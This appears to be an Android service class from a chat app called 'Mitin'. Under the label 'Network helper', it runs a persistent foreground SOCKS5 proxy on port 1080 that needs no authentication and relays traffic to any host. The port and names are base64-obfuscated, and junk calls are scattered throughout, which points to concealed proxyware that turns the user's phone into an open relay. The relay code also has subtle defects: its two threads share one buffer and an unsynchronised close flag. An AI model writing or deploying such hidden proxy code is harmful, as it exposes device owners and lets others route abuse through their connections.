package chat.mitin.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NetworkService extends Service {
    private static final String TAG = "NetworkService";
    private static final int PROXY_PORT = Integer.parseInt(Encryptor.decode("MTA4MA=="));
    private static final String CHANNEL_ID = Encryptor.decode("TWVpdGluTmV0d29yaw==");
    private static final int NOTIF_ID = 1;

    private ServerSocket serverSocket;
    private ExecutorService executor;
    private volatile boolean running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        executor = Executors.newCachedThreadPool();
        Obfuscator.junk();
        Log.d(TAG, "NetworkService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Obfuscator.junk();
        startForeground(NOTIF_ID, createNotification());
        startProxy();
        return START_STICKY;
    }

    public void startProxy() {
        if (running) return;
        running = true;
        Obfuscator.junk();
        executor.submit(this::proxyLoop);
        Log.d(TAG, "Network helper started on port " + PROXY_PORT);
    }

    public void stopProxy() {
        running = false;
        try {
            if (serverSocket != null) serverSocket.close();
        } catch (Exception e) {
            Log.e(TAG, "Error stopping network helper: " + e.getMessage());
        }
        Obfuscator.junk();
        Log.d(TAG, "Network helper stopped");
    }

    public boolean isRunning() {
        Obfuscator.junk();
        return running;
    }

    private void proxyLoop() {
        try {
            serverSocket = new ServerSocket(PROXY_PORT);
            Obfuscator.junk();
            Log.d(TAG, "Network helper listening on port " + PROXY_PORT);
            while (running) {
                try {
                    Socket client = serverSocket.accept();
                    Obfuscator.junk();
                    executor.submit(() -> handleSocks5(client));
                } catch (SocketException e) {
                    if (!running) break;
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Network helper error: " + e.getMessage());
        }
    }

    private void handleSocks5(Socket client) {
        try {
            Obfuscator.junk();
            InputStream in = client.getInputStream();
            OutputStream out = client.getOutputStream();
            byte[] buffer = new byte[1024];

            int len = in.read(buffer);
            if (len < 1 || buffer[0] != 0x05) {
                client.close();
                return;
            }

            out.write(new byte[]{0x05, 0x00});
            out.flush();

            len = in.read(buffer);
            if (len < 8) {
                client.close();
                return;
            }

            int cmd = buffer[1];
            if (cmd != 0x01) {
                client.close();
                return;
            }

            String host;
            int port;
            int addrType = buffer[3];

            if (addrType == 0x01) {
                host = String.format("%d.%d.%d.%d",
                        buffer[4] & 0xFF, buffer[5] & 0xFF,
                        buffer[6] & 0xFF, buffer[7] & 0xFF);
                port = ((buffer[8] & 0xFF) << 8) | (buffer[9] & 0xFF);
            } else if (addrType == 0x03) {
                int nameLen = buffer[4] & 0xFF;
                host = new String(buffer, 5, nameLen);
                port = ((buffer[5 + nameLen] & 0xFF) << 8) | (buffer[6 + nameLen] & 0xFF);
            } else {
                client.close();
                return;
            }

            Obfuscator.junk();
            Socket dest = new Socket();
            dest.connect(new InetSocketAddress(host, port), 10000);

            byte[] response = new byte[10];
            response[0] = 0x05;
            response[1] = 0x00;
            response[2] = 0x00;
            response[3] = 0x01;
            out.write(response);
            out.flush();

            relayData(client, dest);

        } catch (Exception e) {
            Log.e(TAG, "Network helper error: " + e.getMessage());
        }
    }

    private void relayData(Socket client, Socket dest) {
        try {
            Obfuscator.junk();
            InputStream in1 = client.getInputStream();
            OutputStream out1 = client.getOutputStream();
            InputStream in2 = dest.getInputStream();
            OutputStream out2 = dest.getOutputStream();

            byte[] buffer = new byte[8192];
            boolean[] closed = {false};

            Thread t1 = new Thread(() -> {
                try {
                    int len;
                    while ((len = in1.read(buffer)) != -1) {
                        out2.write(buffer, 0, len);
                        out2.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
                closeSockets(client, dest);
            });

            Thread t2 = new Thread(() -> {
                try {
                    int len;
                    while ((len = in2.read(buffer)) != -1) {
                        out1.write(buffer, 0, len);
                        out1.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
                closeSockets(client, dest);
            });

            t1.start();
            t2.start();

            while (!closed[0]) {
                Obfuscator.junk();
                Thread.sleep(100);
            }

        } catch (Exception e) {
            Log.e(TAG, "Relay error: " + e.getMessage());
        }
    }

    private void closeSockets(Socket s1, Socket s2) {
        try { s1.close(); } catch (Exception e) {}
        try { s2.close(); } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Network Helper", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Mitin")
                .setContentText("Network helper active")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        stopProxy();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
